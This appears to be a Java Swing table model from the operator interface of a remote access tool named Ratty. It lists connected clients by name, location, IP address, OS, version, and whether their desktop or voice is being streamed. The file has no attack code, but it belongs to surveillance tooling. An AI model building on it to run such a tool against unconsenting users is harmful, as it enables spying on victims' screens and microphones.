package de.sogomn.rat.server.gui;

import static de.sogomn.rat.Ratty.LANGUAGE;

import java.util.ArrayList;
import java.util.function.Function;

import javax.swing.table.AbstractTableModel;

final class ServerClientTableModel extends AbstractTableModel {
	private static final long serialVersionUID = 919111102883611810L;
	
	private ArrayList<ServerClient> serverClients;
	private ArrayList<Column> columns;
	
	private static final Column NAME = new Column(LANGUAGE.getString("column.name"), String.class, ServerClient::getName);
	private static final Column LOCATION = new Column(LANGUAGE.getString("column.location"), String.class, ServerClient::getLocation);
	private static final Column IP_ADDRESS = new Column(LANGUAGE.getString("column.address"), String.class, ServerClient::getAddress);
	private static final Column OS = new Column(LANGUAGE.getString("column.os"), String.class, ServerClient::getOs);
	private static final Column VERSION = new Column(LANGUAGE.getString("column.version"), String.class, ServerClient::getVersion);
	private static final Column STREAMING_DESKTOP = new Column(LANGUAGE.getString("column.desktop"), Boolean.class, ServerClient::isStreamingDesktop);
	private static final Column STREAMING_VOICE = new Column(LANGUAGE.getString("column.voice"), Boolean.class, ServerClient::isStreamingVoice);
	
	public ServerClientTableModel() {
		serverClients = new ArrayList<ServerClient>();
		columns = new ArrayList<Column>();
		
		addColumn(NAME);
		addColumn(LOCATION);
		addColumn(IP_ADDRESS);
		addColumn(OS);
		addColumn(VERSION);
		addColumn(STREAMING_DESKTOP);
		addColumn(STREAMING_VOICE);
	}
	
	public void addColumn(final Column column) {
		columns.add(column);
	}
	
	public void removeColumn(final Column column) {
		columns.remove(column);
	}
	
	@Override
	public String getColumnName(final int columnIndex) {
		final int columnCount = columns.size();
		
		if (columnIndex <= columnCount - 1 && columnIndex >= 0) {
			final Column column = columns.get(columnIndex);
			
			return column.name;
		}
		
		return super.getColumnName(columnIndex);
	}
	
	@Override
	public Class<?> getColumnClass(final int columnIndex) {
		final int columnCount = columns.size();
		if (columnIndex <= columnCount - 1 && columnIndex >= 0) {
			final Column column = columns.get(columnIndex);
			
			return column.clazz;
		}
		
		return super.getColumnClass(columnIndex);
	}
	
	@Override
	public boolean isCellEditable(final int rowIndex, final int columnIndex) {
		return false;
	}
	
	@Override
	public Object getValueAt(final int rowIndex, final int columnIndex) {
		final ServerClient serverClient = getServerClient(rowIndex);
		final int columnCount = columns.size();
		
		if (serverClient == null || columnIndex > columnCount - 1 || columnIndex < 0) {
			return null;
		}
		
		final Column column = columns.get(columnIndex);
		final Function<ServerClient, ?> value = column.value;
		
		return value.apply(serverClient);
	}
	
	@Override
	public int getColumnCount() {
		return columns.size();
	}
	
	@Override
	public int getRowCount() {
		return serverClients.size();
	}
	
	public void addServerClient(final ServerClient client) {
		serverClients.add(client);
		fireTableDataChanged();
	}
	
	public void removeServerClient(final ServerClient client) {
		serverClients.remove(client);
		fireTableDataChanged();
	}
	
	public ServerClient getServerClient(final int rowIndex) {
		if (rowIndex <= serverClients.size() - 1 && rowIndex >= 0) {
			return serverClients.get(rowIndex);
		}
		
		return null;
	}
	
	public static final class Column {
		
		final String name;
		final Class<?> clazz;
		final Function<ServerClient, ?> value;
		
		public Column(final String name, final Class<?> clazz, final Function<ServerClient, ?> value) {
			this.name = name;
			this.clazz = clazz;
			this.value = value;
		}
		
	}
	
}
